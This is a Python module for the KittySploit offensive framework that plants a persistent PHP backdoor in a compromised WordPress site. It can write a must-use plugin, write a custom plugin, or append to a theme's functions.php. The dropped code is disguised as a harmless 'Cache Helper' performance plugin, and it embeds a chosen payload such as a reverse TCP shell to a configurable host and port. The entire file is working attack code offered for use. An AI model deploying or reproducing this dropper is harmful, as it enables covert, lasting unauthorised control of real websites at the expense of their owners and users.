#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.post.linux.persistence_helpers import LinuxPersistenceMixin, PERSISTENCE_AGENT


class Module(Post, LinuxPersistenceMixin):
    __info__ = {
        "name": "WordPress Theme/Plugin Dropper",
        "description": (
            "Installs PHP persistence in a WordPress site via must-use plugin, "
            "custom plugin, or theme functions.php append."
        ),
        "author": "KittySploit Team",
        "platform": Platform.LINUX,
        "session_type": [SessionType.SHELL, SessionType.METERPRETER, SessionType.SSH],
        "tags": ["persistence", "wordpress", "php", "web"],
    'agent': {
        'risk': '',
        'effects': [],
        'expected_requests': 1,
        'reversible': True,
        'approval_required': False,
        'produces': [],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': ['shell'],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'root', 'from_detail': ''}],
         'consumes_capabilities': ['shell'],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    wp_root = OptString("/var/www/html", "WordPress installation root (contains wp-config.php)", True)
    drop_method = OptChoice(
        "mu-plugin",
        "Drop method: mu-plugin, plugin, or theme_functions",
        True,
        choices=["mu-plugin", "plugin", "theme_functions"],
    )
    theme_name = OptString("", "Theme slug for theme_functions (empty = auto first theme)", False)
    plugin_slug = OptString("ks-cache-helper", "Plugin folder name when drop_method=plugin", False)
    payload_path = OptString("", "Payload module (e.g. payloads/singles/cmd/php/reverse_tcp)", True)
    target = OptChoice("PHP", "Payload embedding", True, choices=["PHP", "Linux command"])
    lhost = OptString("", "Local host for reverse payloads", False)
    lport = OptPort(4444, "Local port for reverse payloads", False)

    def _wp_config(self) -> str:
        root = self._opt(self.wp_root).rstrip("/")
        return f"{root}/wp-config.php"

    def _detect_theme(self) -> str:
        manual = self._opt(self.theme_name)
        if manual:
            return manual
        root = self._opt(self.wp_root).rstrip("/")
        themes_dir = f"{root}/wp-content/themes"
        listing = self.linux_execute(f"ls -1 {themes_dir} 2>/dev/null | grep -v '^\\.' | head -n 1")
        return (listing or "").strip()

    def _target_path(self) -> str:
        root = self._opt(self.wp_root).rstrip("/")
        method = self._opt(self.drop_method)
        if method == "mu-plugin":
            return f"{root}/wp-content/mu-plugins/ks-cache-helper.php"
        if method == "plugin":
            slug = self._opt(self.plugin_slug) or "ks-cache-helper"
            return f"{root}/wp-content/plugins/{slug}/{slug}.php"
        theme = self._detect_theme()
        if not theme:
            raise ProcedureError(FailureType.NotFound, "Could not detect WordPress theme")
        return f"{root}/wp-content/themes/{theme}/functions.php"

    def _wrap_content(self, encoded: str, method: str) -> str:
        body = self._get_embedded_payload(encoded)
        if method == "mu-plugin":
            return (
                "<?php\n"
                "/**\n"
                " * Plugin Name: Cache Helper\n"
                " * Description: Performance cache helper\n"
                " */\n"
                f"{body}\n"
            )
        if method == "plugin":
            slug = self._opt(self.plugin_slug) or "ks-cache-helper"
            return (
                "<?php\n"
                "/**\n"
                f" * Plugin Name: {slug}\n"
                " * Version: 1.0\n"
                " */\n"
                f"{body}\n"
            )
        return f"\n// ks-cache\n{body}\n"

    def check(self):
        cfg = self._wp_config()
        if not self.file_exist(cfg):
            print_error(f"WordPress not found (missing {cfg})")
            return False
        try:
            target = self._target_path()
        except ProcedureError as exc:
            print_error(str(exc))
            return False
        parent = target.rsplit("/", 1)[0]
        if not self._writable_target(target, parent):
            print_error(f"Target not writable: {target}")
            return False
        print_success(f"WordPress found; drop target writable: {target}")
        return True

    def run(self):

        if not self.linux_require_linux():
            return False

        if not self.check():
            return False

        encoded = self._generate_payload()
        method = self._opt(self.drop_method)
        target = self._target_path()
        content = self._wrap_content(encoded, method)

        if method == "theme_functions" and self.file_exist(target):
            self._maybe_backup(target, "wp_theme_functions")
            print_status(f"Appending to {target}")
            if not self._append_remote_line(target, content.strip()):
                raise ProcedureError(FailureType.PayloadFailed, f"Cannot append to {target}")
        else:
            self._maybe_backup(target, "wp_dropper")
            print_status(f"Writing {target}")
            if not self._write_remote_file(target, content, mode="0644"):
                raise ProcedureError(FailureType.PayloadFailed, f"Cannot write {target}")

        print_good("WordPress persistence installed.")
        print_status(f"Method: {method} -> {target}")
        return True
